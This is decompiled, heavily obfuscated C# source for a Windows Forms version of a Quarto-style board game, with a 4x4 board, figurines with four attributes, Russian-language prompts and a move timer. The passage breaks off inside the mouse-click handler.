using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -829423896;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xEB502053u) % 6u)
					{
					case 3u:
						num = ((int)num2 * -627469546) ^ -992577765;
						continue;
					case 2u:
						Square = square;
						Point = point;
						num = (int)((num2 * 273716291) ^ 0x44E7DA67);
						continue;
					case 1u:
						Big = big;
						num = (int)((num2 * 678438587) ^ 0x1721F514);
						continue;
					case 0u:
						Dark = dark;
						num = ((int)num2 * -1336739777) ^ 0x2B6DC758;
						continue;
					default:
						return;
					case 5u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		int num3 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		double num8 = default(double);
		while (true)
		{
			int num = 1201686294;
			while (true)
			{
				uint num2;
				double num5;
				switch ((num2 = (uint)num ^ 0x3F98AED3u) % 30u)
				{
				case 29u:
					num = ((int)num2 * -433024840) ^ 0xF329C90;
					continue;
				case 28u:
					pictureBox = new PictureBox[4, 4];
					num = (int)((num2 * 2121357148) ^ 0x18E25EB6);
					continue;
				case 27u:
					num3++;
					num = ((int)num2 * -1543875098) ^ -326922807;
					continue;
				case 26u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)(num2 * 360785795) ^ -1035289565;
					continue;
				case 25u:
					num = (int)(num2 * 2095822026) ^ -1611095332;
					continue;
				case 24u:
				{
					int num13;
					if (num3 >= 4)
					{
						num = 260470240;
						num13 = 260470240;
					}
					else
					{
						num = 1944010241;
						num13 = 1944010241;
					}
					continue;
				}
				case 23u:
					borderBox = new PictureBox[4, 4];
					num = (int)(num2 * 1158741782) ^ -591684697;
					continue;
				case 22u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = 117261786;
						num12 = 117261786;
					}
					else
					{
						num11 = 1899708848;
						num12 = 1899708848;
					}
					num = num11 ^ ((int)num2 * -1955608640);
					continue;
				}
				case 21u:
					num = ((int)num2 * -600026830) ^ -161307326;
					continue;
				case 20u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -39924942) ^ -905866363;
					continue;
				case 19u:
				{
					PictureBox[,] array2 = borderBox;
					int num9 = num4;
					int num10 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num3 + num8) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num9, num10] = obj2;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num3]);
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num3]);
					num = (int)(num2 * 2031985055) ^ -2100841785;
					continue;
				}
				case 17u:
					num = (int)(num2 * 1270279922) ^ -1638925459;
					continue;
				case 16u:
					num = (int)((num2 * 1817326539) ^ 0x64597CE4);
					continue;
				case 15u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -784876568) ^ -75459338;
					continue;
				case 14u:
					num4 = 0;
					num = ((int)num2 * -989877939) ^ -1045317807;
					continue;
				case 13u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1213480560) ^ 0x2325F8A7;
					continue;
				}
				case 12u:
					if (num3 >= 2)
					{
						num = ((int)num2 * -1806293368) ^ 0x233B8FDD;
						continue;
					}
					num5 = 0.0;
					goto IL_0293;
				case 11u:
					flag = num4 < 4;
					num = 1450043519;
					continue;
				case 10u:
					num = ((int)num2 * -72792188) ^ -997651170;
					continue;
				case 9u:
				{
					PictureBox[,] array = pictureBox;
					int num6 = num4;
					int num7 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num3 + num8) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num6, num7] = obj;
					num = (int)((num2 * 985358213) ^ 0x329CBBC4);
					continue;
				}
				case 8u:
					num5 = 4.1;
					goto IL_0293;
				case 7u:
					InitializeComponent();
					num = (int)((num2 * 1495900282) ^ 0x4F3800B1);
					continue;
				case 6u:
					num = 2084643781;
					continue;
				case 5u:
					num = ((int)num2 * -148792383) ^ -739036378;
					continue;
				case 4u:
					num = ((int)num2 * -714527761) ^ 0x50FAF550;
					continue;
				case 3u:
					num4++;
					num = ((int)num2 * -381782954) ^ -1276291588;
					continue;
				case 2u:
					num = ((int)num2 * -1537837233) ^ 0x5D79B3F1;
					continue;
				case 1u:
					num3 = 0;
					num = 8860634;
					continue;
				default:
					return;
				case 18u:
					break;
				case 0u:
					return;
					IL_0293:
					num8 = num5;
					num = 164731240;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = -1591190151;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCA2039B9u) % 3u)
				{
				case 2u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0033:
				num = ((int)num2 * -468002635) ^ 0x59D7A19F;
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			int num;
			int num2;
			if (Form1.smethod_16((Control)(object)menu) < 296)
			{
				num = -1267714438;
				num2 = -1267714438;
			}
			else
			{
				num = -1536121414;
				num2 = -1536121414;
			}
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num ^ 0x8BBD3275u) % 6u)
				{
				case 5u:
					num = -1017137994;
					continue;
				case 4u:
					num = ((int)num3 * -667193896) ^ 0x718B5177;
					continue;
				case 3u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num3 * -1644222143) ^ 0x49693DC0;
					continue;
				}
				case 0u:
					num = -1267714438;
					continue;
				case 2u:
					break;
				default:
					Form1.smethod_14(menu);
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1353230693;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCD3A3D79u) % 23u)
				{
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -435482767) ^ -1806881752;
					continue;
				case 21u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = ((int)num2 * -2038750977) ^ -1833975105;
					continue;
				case 20u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = -1643038484;
						num8 = -1643038484;
					}
					else
					{
						num7 = -182653702;
						num8 = -182653702;
					}
					num = num7 ^ ((int)num2 * -1936805062);
					continue;
				}
				case 19u:
					flag = num4 < 4;
					num = -1050914706;
					continue;
				case 18u:
					num = (int)(num2 * 1778707764) ^ -1033737815;
					continue;
				case 17u:
					num = (int)((num2 * 760961338) ^ 0x5401DDE0);
					continue;
				case 16u:
					num3 = 0;
					num = -942090549;
					continue;
				case 15u:
					Paint_Board();
					num = (int)((num2 * 794350217) ^ 0x148D2375);
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1651897535) ^ -457545968;
					continue;
				case 13u:
					flag2 = num3 < 4;
					num = -520904351;
					continue;
				case 12u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = ((int)num2 * -805607477) ^ -1643168363;
					continue;
				case 11u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -1878227778) ^ 0x1DD0729D;
					continue;
				case 10u:
					Paint_Storage();
					num = ((int)num2 * -1087234618) ^ -1853986866;
					continue;
				case 9u:
					num = (int)((num2 * 459469639) ^ 0x14DB46D6);
					continue;
				case 8u:
					num4 = 0;
					num = (int)((num2 * 812096427) ^ 0xAA8169E);
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -1231939076) ^ 0x24507AFA;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -2106035217;
						num6 = -2106035217;
					}
					else
					{
						num5 = -1327725960;
						num6 = -1327725960;
					}
					num = num5 ^ (int)(num2 * 1479565945);
					continue;
				}
				case 4u:
					num4++;
					num = (int)(num2 * 253212693) ^ -900828238;
					continue;
				case 2u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 32939873) ^ -1339866545;
					continue;
				case 1u:
					num3++;
					num = ((int)num2 * -1697699090) ^ -428227355;
					continue;
				case 0u:
					num = -860277235;
					continue;
				default:
					return;
				case 3u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num3 = default(int);
		bool flag = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num11 = default(float);
		int num4 = default(int);
		float num12 = default(float);
		float num6 = default(float);
		float num17 = default(float);
		float num5 = default(float);
		bool dark = default(bool);
		bool flag2 = default(bool);
		bool big = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -1565803557;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA1B19478u) % 40u)
				{
				case 39u:
					num3++;
					num = (int)(num2 * 425737507) ^ -1552341621;
					continue;
				case 38u:
					flag = num3 < 4;
					num = -359321461;
					continue;
				case 37u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -772143985) ^ 0x6BB2E02D;
					continue;
				case 36u:
					Form1.smethod_24(graphics_, brush_, num11 + (float)(num4 * size), num11 + (float)(num3 * size), num12, num12);
					num = -1987358157;
					continue;
				case 35u:
					num11 = (float)size * (num6 / 2f);
					num12 = num17 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 453801717) ^ -970991208;
					continue;
				case 34u:
					Form1.smethod_28(graphics_, brush_, num11 + (float)(num4 * size), num11 + (float)(num3 * size), num12, num12);
					num = (int)(num2 * 1167693508) ^ -35540698;
					continue;
				case 33u:
				{
					int num22;
					int num23;
					if (board[num3, num4].Square)
					{
						num22 = 1262712464;
						num23 = 1262712464;
					}
					else
					{
						num22 = 176791790;
						num23 = 176791790;
					}
					num = num22 ^ (int)(num2 * 1451833442);
					continue;
				}
				case 32u:
					num17 = (float)size * num5;
					num = ((int)num2 * -728870298) ^ 0x5F42D28B;
					continue;
				case 31u:
				{
					int num18;
					int num19;
					if (!dark)
					{
						num18 = 492587664;
						num19 = 492587664;
					}
					else
					{
						num18 = 1553710977;
						num19 = 1553710977;
					}
					num = num18 ^ (int)(num2 * 964573585);
					continue;
				}
				case 30u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = -2011361687;
						num10 = -2011361687;
					}
					else
					{
						num9 = -238249253;
						num10 = -238249253;
					}
					num = num9 ^ ((int)num2 * -682459187);
					continue;
				}
				case 29u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1969892140) ^ -625713968;
					continue;
				case 28u:
					flag2 = num4 < 4;
					num = -22279034;
					continue;
				case 27u:
					num11 = (float)size * (num6 / 2f);
					num12 = num17 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1614074438) ^ 0x743EAC6F;
					continue;
				case 26u:
					num5 = 1f;
					num = ((int)num2 * -1538803221) ^ -1410267865;
					continue;
				case 25u:
					num = (int)((num2 * 1671120261) ^ 0x1B40108D);
					continue;
				case 24u:
					num4++;
					num = -1812027452;
					continue;
				case 23u:
				{
					int num20;
					int num21;
					if (!board[num3, num4].Point)
					{
						num20 = -69266398;
						num21 = -69266398;
					}
					else
					{
						num20 = -1033852225;
						num21 = -1033852225;
					}
					num = num20 ^ ((int)num2 * -1958420224);
					continue;
				}
				case 22u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -728750888) ^ -101967972;
					continue;
				case 21u:
					num = -1950027883;
					continue;
				case 20u:
					num = (int)((num2 * 1469497507) ^ 0x35003DBA);
					continue;
				case 19u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = 0;
					num = (int)(num2 * 1838414242) ^ -2096655198;
					continue;
				case 18u:
					num5 = 0.7f;
					num = -1579652231;
					continue;
				case 17u:
					num = (int)(num2 * 1027844673) ^ -750403496;
					continue;
				case 16u:
					dark = board[num3, num4].Dark;
					num = ((int)num2 * -278619155) ^ 0x464846BF;
					continue;
				case 15u:
					brush_ = Form1.smethod_26();
					num = -1442809192;
					continue;
				case 14u:
					num = (int)((num2 * 1992741371) ^ 0x7AD0C9C1);
					continue;
				case 13u:
				{
					int num15;
					int num16;
					if (!big)
					{
						num15 = -1931647341;
						num16 = -1931647341;
					}
					else
					{
						num15 = -61677989;
						num16 = -61677989;
					}
					num = num15 ^ ((int)num2 * -1766804115);
					continue;
				}
				case 12u:
					flag3 = board[num3, num4] != null;
					num = (int)(num2 * 1950871498) ^ -321607616;
					continue;
				case 11u:
					num6 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -594859093;
					continue;
				case 8u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = 1071720744;
						num14 = 1071720744;
					}
					else
					{
						num13 = 480312177;
						num14 = 480312177;
					}
					num = num13 ^ (int)(num2 * 1845761197);
					continue;
				}
				case 7u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num11 + (float)(num4 * size), num11 + (float)(num3 * size), num12, num12);
					num = ((int)num2 * -19675) ^ 0x67A98DE1;
					continue;
				case 6u:
					num = (int)(num2 * 463990636) ^ -31360359;
					continue;
				case 5u:
					num4 = 0;
					num = -1812027452;
					continue;
				case 4u:
					num = ((int)num2 * -1933499706) ^ -2007011040;
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1014359819;
						num8 = -1014359819;
					}
					else
					{
						num7 = -862319531;
						num8 = -862319531;
					}
					num = num7 ^ (int)(num2 * 1611391088);
					continue;
				}
				case 2u:
					num = -1741694168;
					continue;
				case 1u:
					num6 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1508312416;
					continue;
				case 0u:
					big = board[num3, num4].Big;
					num = -263527131;
					continue;
				default:
					return;
				case 10u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		float num12 = default(float);
		float num5 = default(float);
		float num13 = default(float);
		float num14 = default(float);
		bool flag = default(bool);
		int num8 = default(int);
		float num4 = default(float);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		Brush brush_ = default(Brush);
		bool point = default(bool);
		bool flag4 = default(bool);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num2 = -515944697;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x98C1E4AEu) % 40u)
				{
				case 39u:
					num12 = (float)size * (num5 / 2f) - 4f;
					num13 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = (int)(num3 * 161648471) ^ -1091216415;
					continue;
				case 38u:
					flag = num8 < 2;
					num2 = ((int)num3 * -177795328) ^ 0x6E233294;
					continue;
				case 37u:
					num8 = 0;
					num2 = -1757895834;
					continue;
				case 36u:
					num2 = ((int)num3 * -595845851) ^ -172788373;
					continue;
				case 35u:
					num14 = (float)size * num4;
					num2 = (int)(num3 * 1903507873) ^ -1842967582;
					continue;
				case 34u:
					flag2 = storage[num, num8] != null;
					num2 = -1923727548;
					continue;
				case 33u:
				{
					int num19;
					int num20;
					if (flag3)
					{
						num19 = -280793432;
						num20 = -280793432;
					}
					else
					{
						num19 = -2041806321;
						num20 = -2041806321;
					}
					num2 = num19 ^ (int)(num3 * 1537796811);
					continue;
				}
				case 32u:
					brush_ = Form1.smethod_26();
					num2 = -1489969944;
					continue;
				case 31u:
					num2 = (int)(num3 * 1485913091) ^ -1697730442;
					continue;
				case 30u:
				{
					int num11;
					if (storage[num, num8].Big)
					{
						num2 = -519394302;
						num11 = -519394302;
					}
					else
					{
						num2 = -2004779973;
						num11 = -2004779973;
					}
					continue;
				}
				case 29u:
					num++;
					num2 = (int)(num3 * 1019056725) ^ -1638810796;
					continue;
				case 28u:
					num4 = 1f;
					num2 = (int)((num3 * 1264516829) ^ 0x75009EA6);
					continue;
				case 27u:
					point = storage[num, num8].Point;
					num2 = (int)(num3 * 218359635) ^ -1050674184;
					continue;
				case 25u:
					num2 = (int)((num3 * 2037263489) ^ 0x3A466DAC);
					continue;
				case 24u:
					num2 = ((int)num3 * -941359952) ^ -805290301;
					continue;
				case 23u:
				{
					int num21;
					int num22;
					if (!point)
					{
						num21 = 157875480;
						num22 = 157875480;
					}
					else
					{
						num21 = 1020203320;
						num22 = 1020203320;
					}
					num2 = num21 ^ (int)(num3 * 1342924190);
					continue;
				}
				case 22u:
					num2 = (int)((num3 * 578025462) ^ 0x1BA8777C);
					continue;
				case 21u:
					num4 = 0.7f;
					num2 = -780140625;
					continue;
				case 20u:
					Form1.smethod_20(pictureBox[num, num8], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num8]), Form1.smethod_16((Control)(object)pictureBox[num, num8])));
					num2 = ((int)num3 * -2120927446) ^ -1180834791;
					continue;
				case 19u:
					num2 = (int)((num3 * 955005860) ^ 0x7FB15B02);
					continue;
				case 18u:
					num2 = (int)((num3 * 1767664173) ^ 0x16A054F0);
					continue;
				case 17u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -108102226) ^ 0x5820947E;
					continue;
				case 16u:
					flag4 = num8 < 4;
					num2 = -2090492088;
					continue;
				case 15u:
					Form1.smethod_24(graphics_, brush_, num12, num12, num13, num13);
					num2 = -1228829623;
					continue;
				case 14u:
				{
					int num17;
					int num18;
					if (!flag4)
					{
						num17 = 604616037;
						num18 = 604616037;
					}
					else
					{
						num17 = 1453849170;
						num18 = 1453849170;
					}
					num2 = num17 ^ ((int)num3 * -2032441967);
					continue;
				}
				case 12u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num12, num12, num13, num13);
					num2 = ((int)num3 * -678074364) ^ 0x5E03D75A;
					continue;
				case 11u:
					flag3 = num < 4;
					num2 = -1125080433;
					continue;
				case 10u:
				{
					int num15;
					int num16;
					if (!flag2)
					{
						num15 = -659487268;
						num16 = -659487268;
					}
					else
					{
						num15 = -1201905682;
						num16 = -1201905682;
					}
					num2 = num15 ^ (int)(num3 * 1014491013);
					continue;
				}
				case 9u:
					num13 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1206921222) ^ 0x266899CF;
					continue;
				case 8u:
					num8++;
					num2 = -301395170;
					continue;
				case 7u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num8]));
					num2 = ((int)num3 * -1697665085) ^ -811291048;
					continue;
				case 6u:
					Form1.smethod_28(graphics_, brush_, num12, num12, num13, num13);
					num2 = ((int)num3 * -174025005) ^ 0x4A9AE777;
					continue;
				case 5u:
					num5 = 1f - num4 * 0.4f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * (num5 / 2f) - 4f;
					num2 = -810240681;
					continue;
				case 4u:
					Form1.smethod_30((Control)(object)pictureBox[num, num8]);
					num2 = -1985322162;
					continue;
				case 3u:
				{
					int num9;
					int num10;
					if (storage[num, num8].Dark)
					{
						num9 = -144430180;
						num10 = -144430180;
					}
					else
					{
						num9 = -598259635;
						num10 = -598259635;
					}
					num2 = num9 ^ ((int)num3 * -2129512615);
					continue;
				}
				case 2u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = 328191579;
						num7 = 328191579;
					}
					else
					{
						num6 = 960711666;
						num7 = 960711666;
					}
					num2 = num6 ^ ((int)num3 * -1520012819);
					continue;
				}
				case 1u:
					num5 = 1f - num4 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = -1219812363;
					continue;
				case 0u:
					num2 = (int)(num3 * 1560585468) ^ -596124674;
					continue;
				default:
					return;
				case 13u:
					break;
				case 26u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num8 = default(int);
		bool flag3 = default(bool);
		int num7 = default(int);
		bool flag2 = default(bool);
		int num6 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -347399573;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF5BCA525u) % 30u)
				{
				case 29u:
					num = (int)((num2 * 1597797663) ^ 0x36CBAD48);
					continue;
				case 28u:
					num8 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1431639037) ^ 0x7B42C72D;
					continue;
				case 26u:
				{
					int num11;
					int num12;
					if (flag3)
					{
						num11 = -1014341076;
						num12 = -1014341076;
					}
					else
					{
						num11 = -1953520552;
						num12 = -1953520552;
					}
					num = num11 ^ ((int)num2 * -1193034912);
					continue;
				}
				case 25u:
					num7 = Form1.smethod_33(rnd, 4);
					num = -814186683;
					continue;
				case 24u:
					flag2 = num6 < 4;
					num = -1702987235;
					continue;
				case 23u:
					step = 0;
					num = ((int)num2 * -286811647) ^ -23527494;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -40079584;
					continue;
				case 21u:
					num6++;
					num = (int)(num2 * 702057667) ^ -98279688;
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: true);
					num = -1899441679;
					continue;
				case 19u:
					num = ((int)num2 * -944805178) ^ -993132551;
					continue;
				case 18u:
					num = ((int)num2 * -868603593) ^ 0x5EEEDB78;
					continue;
				case 17u:
					num = ((int)num2 * -1000795184) ^ 0x43F01010;
					continue;
				case 16u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -85267323) ^ 0x2349C8DE;
					continue;
				case 15u:
					num6 = 0;
					num = (int)(num2 * 1454129599) ^ -325440204;
					continue;
				case 14u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = -1844125266;
						num10 = -1844125266;
					}
					else
					{
						num9 = -1522360595;
						num10 = -1522360595;
					}
					num = num9 ^ ((int)num2 * -1699392670);
					continue;
				}
				case 13u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 1008586795) ^ -1868529487;
					continue;
				case 12u:
					num3++;
					num = ((int)num2 * -1265562258) ^ -481055879;
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1516567205) ^ -1625883416;
					continue;
				case 10u:
					flag = num3 < 4;
					num = -246426054;
					continue;
				case 9u:
					num = ((int)num2 * -1922020601) ^ -1661296128;
					continue;
				case 8u:
					step = 1;
					num = (int)((num2 * 219385133) ^ 0x480DA439);
					continue;
				case 7u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -109895962) ^ 0x2DE5E6DD;
					continue;
				case 6u:
					Form1_Load(this, Form1.smethod_31());
					flag3 = turn;
					num = ((int)num2 * -66891670) ^ -1938069715;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 665719938) ^ -1336035842;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.Blue);
					num = ((int)num2 * -1766102057) ^ -105171588;
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -259702475;
						num5 = -259702475;
					}
					else
					{
						num4 = -1555140044;
						num5 = -1555140044;
					}
					num = num4 ^ (int)(num2 * 219043828);
					continue;
				}
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1333590539) ^ -109385754;
					continue;
				case 0u:
					num3 = 0;
					num = -1036030574;
					continue;
				default:
					return;
				case 27u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
		while (true)
		{
			int num = -1784459110;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA3BF8771u) % 3u)
				{
				case 1u:
					goto IL_0041;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0041:
				num = (int)(num2 * 1917175884) ^ -1219434532;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		int num4 = default(int);
		Point point = default(Point);
		int num3 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			int num = -67205202;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x8FA96D18u) % 25u)
				{
				case 24u:
					num4 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -618618261) ^ -1462530549;
					continue;
				case 23u:
					Form1.smethod_5((Control)(object)borderBox[num3, num6], Color.White);
					num = -995809121;
					continue;
				case 22u:
					num5 -= 4;
					num = (int)((num2 * 1012857029) ^ 0x72C9F597);
					continue;
				case 21u:
					flag2 = num6 < 4;
					num = -698729028;
					continue;
				case 19u:
					num = ((int)num2 * -930373214) ^ 0x616B27DD;
					continue;
				case 18u:
					num7 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00d4;
				case 17u:
					num5 = point.X / size;
					num = (int)(num2 * 672395459) ^ -38245536;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = -149397479;
						num11 = -149397479;
					}
					else
					{
						num10 = -1140313532;
						num11 = -1140313532;
					}
					num = num10 ^ ((int)num2 * -1537586445);
					continue;
				}
				case 15u:
				{
					int num14;
					int num15;
					if (flag)
					{
						num14 = 1951272898;
						num15 = 1951272898;
					}
					else
					{
						num14 = 904986799;
						num15 = 904986799;
					}
					num = num14 ^ (int)(num2 * 1262837726);
					continue;
				}
				case 14u:
					num = ((int)num2 * -2101068215) ^ 0x1370C2E9;
					continue;
				case 13u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = 1121169137;
						num13 = 1121169137;
					}
					else
					{
						num12 = 338805331;
						num13 = 338805331;
					}
					num = num12 ^ ((int)num2 * -1103099435);
					continue;
				}
				case 12u:
					flag4 = num5 > 1;
					num = (int)((num2 * 847967228) ^ 0x245B2564);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 1192658224) ^ 0x2750BA02);
					continue;
				case 10u:
				{
					int num8;
					int num9;
					if (flag4)
					{
						num8 = -1633281279;
						num9 = -1633281279;
					}
					else
					{
						num8 = -1609642230;
						num9 = -1609642230;
					}
					num = num8 ^ ((int)num2 * -1228284887);
					continue;
				}
				case 9u:
					num3 = 0;
					num = (int)(num2 * 705358902) ^ -1956659184;
					continue;
				case 8u:
					num6 = 0;
					num = -1123804382;
					continue;
				case 7u:
					if (storage[num4, num5] != null)
					{
						num = -1996519507;
						continue;
					}
					num7 = 0;
					goto IL_00d4;
				case 6u:
					num6++;
					num = (int)((num2 * 2002289838) ^ 0x366EB0AB);
					continue;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Red);
